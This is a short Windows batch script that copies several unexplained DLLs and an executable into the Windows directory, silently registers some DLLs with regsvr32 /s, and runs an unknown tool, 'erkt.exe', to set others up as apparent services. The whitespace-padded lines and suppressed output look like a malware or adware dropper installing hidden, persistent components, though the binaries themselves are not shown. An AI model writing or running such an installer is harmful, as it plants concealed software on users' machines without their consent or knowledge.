@echo    off

copy        hupsrv.dll      %windir%\hupsrv.dll    >nul
copy     sdrmod.dll  %windir%
copy    advrepdow.dll       %windir%     >nul
copy     wtopmod.exe  %windir%       >nul
copy     bindmod.dll   %windir%\bindmod.dll      >nul

erkt.exe   %windir%\hupsrv.dll  hupsrv
erkt.exe     %windir%\bindmod.dll        bindmod
%windir%\system32\regsvr32.exe     /s    %windir%\advrepdow.dll
regsvr32.exe       /s  sdrmod.dll

wtopmod.exe  reg
erkt.exe   reqvs
